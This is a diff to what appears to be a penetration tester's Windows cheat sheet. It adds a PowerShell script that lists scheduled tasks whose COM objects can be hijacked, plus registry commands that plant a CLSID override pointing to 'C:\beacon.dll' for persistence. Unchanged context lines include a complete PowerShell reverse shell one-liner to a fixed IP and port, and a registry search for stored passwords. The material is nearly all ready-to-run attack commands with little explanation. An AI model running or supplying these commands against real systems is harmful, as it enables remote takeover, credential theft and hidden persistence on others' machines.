@@ -135,6 +135,33 @@ c:\unattend.xml
 
 `reg query HKLM /f pass /t REG_SZ /s`
 
+#### Check if entry exists in registry (POWERSHELL)
+
+`Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"`
+
+#### Powershell Script to Find Hijackable COM Components in Task Scheduler
+
+```
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+  if ($Task.Actions.ClassId -ne $null)
+  {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+    }
+  }
+}
+```
+
 <!--
 ##################################################################
 ##################################################################
@@ -218,13 +245,21 @@ c:\unattend.xml
 ##################################################################
 -->
 
-## Shells
+## Shells/Persistence
 
 #### Powershell Reverse Shell One Liner
 
 ```
 $client = New-Object System.Net.Sockets.TCPClient("192.168.49.203",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+
+#### Add New HKCU Registry Item (POWERSHELL)
+
+`New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"`
+
+#### Point Registry Item Towards EXE/DLL or Add/Edit a Field Value (POWERSHELL)
+
+`New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"`
 
 <!--
 ##################################################################
